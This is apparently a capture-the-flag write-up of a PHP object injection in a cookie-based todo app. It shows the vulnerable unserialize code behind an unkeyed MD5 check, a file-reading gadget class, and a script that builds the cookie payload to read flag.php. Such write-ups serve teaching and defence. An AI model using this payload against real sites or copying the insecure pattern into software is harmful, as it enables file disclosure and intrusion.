([dumped Sourcecode](https://gist.github.com/stefan2904/21a3b0ca10163f9fced6ab3767a92a08))

## Write-up

Since it's the easiest web challenge, it was easily possible to dump the sourcecode. The app is a simple todo manager, which stores the tasks in a cookie. Reading the code, we quickly noticed the suspicious `unserialize`:

```php
<?php
if(isset($_COOKIE['todos'])){
    $c = $_COOKIE['todos'];
    $h = substr($c, 0, 32);
    $m = substr($c, 32);
    if(md5($m) === $h){
        $todos = unserialize($m);
    }
}
?>
```

This is a prime example for [PHP Object Injection](https://www.owasp.org/index.php/PHP_Object_Injection). In this case it was not necessary to dig deeper into PHP internal classes, since the class in need was conveniently already present; the class used to display the source (and eny other file) ...

```php
<?php
Class GPLSourceBloater{
    public function __toString()
    {
        return highlight_file('license.txt', true).highlight_file($this->source, true);
    }
}
?>
```

So we need to build a `GPLSourceBloater` object, set its `source` attribute to the desired file (`flag.php`) and serialize it.

```php
<?

Class GPLSourceBloater{
    public function __toString()
    {
        return highlight_file('license.txt', true).highlight_file($this->source, true);
    }
}

$foo = new GPLSourceBloater();
$foo->source = 'flag.php';

$bar = [];
$bar[] = $foo;

$m = serialize($bar);
$h = md5($m);

echo urlencode($h.$m);

?>
```

After storing the serialized object to a cookie named `todos` and loading the page again, `__toString()` did its job and we were presented with the flag: 

```
hxp{Are you glad that at least Java(TM) isn't affected by serialization bugs?}
```
